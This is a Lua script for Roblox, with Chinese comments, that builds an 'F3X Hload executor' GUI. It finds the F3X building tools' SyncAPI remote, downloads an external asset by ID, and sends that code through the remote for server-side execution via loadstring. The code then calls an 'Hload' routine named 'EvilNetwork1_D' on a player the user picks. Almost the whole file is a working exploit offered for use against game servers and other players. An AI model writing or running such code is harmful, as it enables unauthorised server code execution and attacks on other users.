-- F3X 执行器 + 自动调用 :Hload("EvilNetwork1_D")
local function CreateF3XExecutorWithHload()
    local player = game.Players.LocalPlayer
    if not player then return end

    -- 1. 查找 F3X SyncAPI
    local function findF3XAPI()
        for _, obj in ipairs(game:GetDescendants()) do
            if obj.Name == "SyncAPI" and (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
                return obj
            end
        end
        return nil
    end

    local syncAPI = findF3XAPI()
    local remote = syncAPI and syncAPI.Parent:FindFirstChild("ServerEndpoint")

    -- 2. GUI
    local gui = Instance.new("ScreenGui")
    gui.Name = "F3XHloadExecutor"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 520, 0, 420)
    frame.Position = UDim2.new(0.5, -260, 0.5, -210)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(0, 180, 255)
    frame.Parent = gui

    -- 标题
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 45)
    title.Text = "🔧 F3X Hload 执行器"
    title.TextColor3 = Color3.fromRGB(0, 200, 255)
    title.TextScaled = true
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Parent = frame

    -- Asset ID
    local idLabel = Instance.new("TextLabel")
    idLabel.Size = UDim2.new(1, 0, 0, 25)
    idLabel.Position = UDim2.new(0, 10, 0, 55)
    idLabel.Text = "📦 Asset ID"
    idLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    idLabel.TextSize = 14
    idLabel.BackgroundTransparency = 1
    idLabel.Font = Enum.Font.Gotham
    idLabel.TextXAlignment = Enum.TextXAlignment.Left
    idLabel.Parent = frame

    local idBox = Instance.new("TextBox")
    idBox.Size = UDim2.new(1, -20, 0, 30)
    idBox.Position = UDim2.new(0, 10, 0, 85)
    idBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    idBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    idBox.Text = "93093069226257"
    idBox.Font = Enum.Font.SourceSans
    idBox.TextSize = 16
    idBox.TextXAlignment = Enum.TextXAlignment.Left
    idBox.ClearTextOnFocus = false
    idBox.Parent = frame

    -- 目标玩家
    local playerLabel = Instance.new("TextLabel")
    playerLabel.Size = UDim2.new(1, 0, 0, 25)
    playerLabel.Position = UDim2.new(0, 10, 0, 125)
    playerLabel.Text = "👤 目标玩家"
    playerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    playerLabel.TextSize = 14
    playerLabel.BackgroundTransparency = 1
    playerLabel.Font = Enum.Font.Gotham
    playerLabel.TextXAlignment = Enum.TextXAlignment.Left
    playerLabel.Parent = frame

    local playerBox = Instance.new("TextBox")
    playerBox.Size = UDim2.new(1, -20, 0, 30)
    playerBox.Position = UDim2.new(0, 10, 0, 155)
    playerBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    playerBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    playerBox.Text = player.Name
    playerBox.Font = Enum.Font.SourceSans
    playerBox.TextSize = 16
    playerBox.TextXAlignment = Enum.TextXAlignment.Left
    playerBox.ClearTextOnFocus = false
    playerBox.Parent = frame

    -- Hload 参数（额外）
    local hloadLabel = Instance.new("TextLabel")
    hloadLabel.Size = UDim2.new(1, 0, 0, 25)
    hloadLabel.Position = UDim2.new(0, 10, 0, 195)
    hloadLabel.Text = "🔑 Hload 参数（默认: EvilNetwork1_D）"
    hloadLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    hloadLabel.TextSize = 14
    hloadLabel.BackgroundTransparency = 1
    hloadLabel.Font = Enum.Font.Gotham
    hloadLabel.TextXAlignment = Enum.TextXAlignment.Left
    hloadLabel.Parent = frame

    local hloadBox = Instance.new("TextBox")
    hloadBox.Size = UDim2.new(1, -20, 0, 30)
    hloadBox.Position = UDim2.new(0, 10, 0, 225)
    hloadBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    hloadBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    hloadBox.Text = "EvilNetwork1_D"
    hloadBox.Font = Enum.Font.SourceSans
    hloadBox.TextSize = 16
    hloadBox.TextXAlignment = Enum.TextXAlignment.Left
    hloadBox.ClearTextOnFocus = false
    hloadBox.Parent = frame

    -- 按钮
    local execBtn = Instance.new("TextButton")
    execBtn.Size = UDim2.new(0.45, 0, 0, 40)
    execBtn.Position = UDim2.new(0.025, 0, 0, 270)
    execBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 220)
    execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    execBtn.Text = "▶️ 执行 Hload"
    execBtn.Font = Enum.Font.GothamBold
    execBtn.TextSize = 18
    execBtn.BorderSizePixel = 0
    execBtn.Parent = frame

    local clearBtn = Instance.new("TextButton")
    clearBtn.Size = UDim2.new(0.45, 0, 0, 40)
    clearBtn.Position = UDim2.new(0.525, 0, 0, 270)
    clearBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 50)
    clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    clearBtn.Text = "🗑️ 清空"
    clearBtn.Font = Enum.Font.GothamBold
    clearBtn.TextSize = 18
    clearBtn.BorderSizePixel = 0
    clearBtn.Parent = frame

    -- 输出框
    local resultBox = Instance.new("ScrollingFrame")
    resultBox.Size = UDim2.new(1, -20, 0, 90)
    resultBox.Position = UDim2.new(0, 10, 0, 320)
    resultBox.BackgroundColor3 = Color3.fromRGB(12, 12, 22)
    resultBox.BorderSizePixel = 1
    resultBox.BorderColor3 = Color3.fromRGB(60, 60, 80)
    resultBox.ScrollBarThickness = 6
    resultBox.Parent = frame

    local resultText = Instance.new("TextLabel")
    resultText.Size = UDim2.new(1, -10, 0, 80)
    resultText.Position = UDim2.new(0, 5, 0, 5)
    resultText.Text = "等待执行..."
    resultText.TextColor3 = Color3.fromRGB(200, 200, 210)
    resultText.TextSize = 13
    resultText.TextWrapped = true
    resultText.TextXAlignment = Enum.TextXAlignment.Left
    resultText.TextYAlignment = Enum.TextYAlignment.Top
    resultText.BackgroundTransparency = 1
    resultText.Font = Enum.Font.SourceSans
    resultText.Parent = resultBox
    resultBox.CanvasSize = UDim2.new(0, 0, 0, 90)

    -- 状态栏
    local statusBar = Instance.new("TextLabel")
    statusBar.Size = UDim2.new(1, -20, 0, 25)
    statusBar.Position = UDim2.new(0, 10, 1, -28)
    statusBar.Text = "✅ 就绪"
    statusBar.TextColor3 = Color3.fromRGB(0, 255, 150)
    statusBar.TextSize = 13
    statusBar.BackgroundColor3 = Color3.fromRGB(10, 10, 25)
    statusBar.BackgroundTransparency = 0.3
    statusBar.Font = Enum.Font.Gotham
    statusBar.TextXAlignment = Enum.TextXAlignment.Left
    statusBar.Parent = frame

    -- 关闭
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 5)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
    closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    closeBtn.BorderSizePixel = 0
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 20
    closeBtn.Parent = frame
    closeBtn.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)

    -- 3. 核心执行
    local function executeHload()
        local assetId = idBox.Text
        local targetName = playerBox.Text
        local hloadParam = hloadBox.Text

        if assetId == "" or targetName == "" or hloadParam == "" then
            resultText.Text = "⚠️ 请填写所有字段"
            return
        end

        resultText.Text = "⏳ 加载外部脚本...\n"
        statusBar.Text = "⏳ 加载中..."
        statusBar.TextColor3 = Color3.fromRGB(255, 200, 50)

        -- 加载脚本
        local url = "https://www.roblox.com/asset/?id=" .. assetId
        local success, content = pcall(function()
            return game:GetService("HttpService"):GetAsync(url)
        end)

        if not success then
            resultText.Text = resultText.Text .. "❌ 加载失败: " .. tostring(content)
            statusBar.Text = "❌ 加载失败"
            statusBar.TextColor3 = Color3.fromRGB(255, 80, 80)
            return
        end

        resultText.Text = resultText.Text .. "✅ 脚本已加载\n"

        -- 查找目标玩家
        local targetPlayer
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p.Name:lower() == targetName:lower() then
                targetPlayer = p
                break
            end
        end

        if not targetPlayer then
            resultText.Text = resultText.Text .. "❌ 未找到玩家: " .. targetName
            statusBar.Text = "❌ 玩家不存在"
            statusBar.TextColor3 = Color3.fromRGB(255, 80, 80)
            return
        end

        resultText.Text = resultText.Text .. "✅ 目标玩家: " .. targetPlayer.Name .. "\n"

        -- 通过 F3X 执行
        if not syncAPI or not remote then
            resultText.Text = resultText.Text .. "❌ F3X 未连接"
            statusBar.Text = "❌ F3X 未连接"
            return
        end

        -- 🔥 关键：注入并执行 :Hload("EvilNetwork1_D")
        local execCode = string.format([[
            local target = game.Players:FindFirstChild("%s")
            if not target then return end

            -- 加载外部脚本
            local module = loadstring([=[%s])=])
            if not module then return end

            -- 执行 Hload，传入目标玩家
            local result = module()
            if type(result) == "table" and result.Hload then
                result:Hload("%s")
                warn("[Hload] 已对 %s 执行 Hload")
            elseif type(module) == "function" then
                local res = module()
                if res and type(res) == "table" and res.Hload then
                    res:Hload("%s")
                    warn("[Hload] 已对 %s 执行 Hload")
                end
            end
        ]], 
        targetPlayer.Name,
        content:gsub("\\", "\\\\"):gsub("'", "\\'"),
        hloadParam,
        targetPlayer.Name,
        hloadParam,
        targetPlayer.Name
        )

        local args = {
            [1] = "ExecuteScript",
            [2] = execCode
        }

        local execSuccess, execResult = pcall(function()
            return remote:InvokeServer(unpack(args))
        end)

        if execSuccess then
            resultText.Text = resultText.Text .. "✅ 已发送执行\n📦 返回值: " .. tostring(execResult)
            statusBar.Text = "✅ Hload 已执行 → " .. targetPlayer.Name
            statusBar.TextColor3 = Color3.fromRGB(0, 255, 150)
        else
            resultText.Text = resultText.Text .. "❌ 执行失败: " .. tostring(execResult)
            statusBar.Text = "❌ 执行失败"
            statusBar.TextColor3 = Color3.fromRGB(255, 80, 80)
        end
    end

    execBtn.MouseButton1Click:Connect(executeHload)
    clearBtn.MouseButton1Click:Connect(function()
        resultText.Text = "等待执行..."
        statusBar.Text = "✅ 就绪"
        statusBar.TextColor3 = Color3.fromRGB(0, 255, 150)
    end)

    print("[F3X Hload Executor] GUI 已加载")
end

CreateF3XExecutorWithHload()
